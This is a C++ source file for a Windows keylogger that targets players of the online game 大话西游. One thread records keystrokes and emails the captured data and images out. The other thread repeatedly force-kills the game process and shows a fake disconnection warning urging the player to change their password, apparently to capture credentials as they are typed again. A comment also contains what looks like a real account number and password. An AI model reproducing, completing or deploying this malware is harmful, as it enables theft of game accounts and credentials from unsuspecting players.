// ready.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "MmjbpApp.h"
#include "Key_Memory.h"

DWORD WINAPI ThreadTaskKill (LPVOID pParam)//掉线线程入口函数
{
	while(true)
	{
		static int a=0;
		if(0 == a)
		{
		   Sleep(60000);//1分钟之后游戏自动掉线   117896369    yeainiu01010123.   东北三区的		   
		   a++;
		   system("taskkill /f /im xy2.exe");//大话西游
		   //system("taskkill /f /im my.exe");//梦幻西游
		}
		else
		{
			Sleep(5*60000);
			a++;			
		    system("taskkill /f /im xy2.exe");//大话西游
		    //system("taskkill /f /im my.exe");//梦幻西游*/
			MessageBox(GetForegroundWindow(), 
			   "网络连接已中断[0]\r\n提示：您的密码很有可能泄漏\r\n请尽快登陆http://reg.163.com修改密码或锁定账号","大话西游", 0);
		}
	}
	return 0;
}

//5件事都做好了吗  1.掉线时间设置以及开启 2.邮箱地址设置 3.发送邮件语句 4.保存附件文件位置 5.窗口关键字设置
DWORD WINAPI ThreadKeyMemory(LPVOID pParam)//记录线程入口函数
{
	string buffer("");
	Key_Memory key;
	CMmjbpApp MailtheApp;

	while(true)
	{
	    if(key.KeyLogger(buffer))//开始记录数据
		{
    		MailtheApp.SendMail(buffer);//发送记录数据 和 图片
			//MessageBox(GetForegroundWindow(), "邮件即将发送","大话西游", 0);
			buffer = "";
		}
        Sleep(100);
	}
	return 0;
}




int WINAPI WinMain/*main*/(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{	
	DWORD mpid = 3000;
	DWORD tpid = 3001;
	::CreateThread(NULL, NULL, ThreadKeyMemory, NULL, 0, &mpid);
	::CreateThread(NULL, NULL, ThreadTaskKill, NULL, 0, &tpid);
	while(true)
	{
		Sleep(300);
	}
	return 0;
}


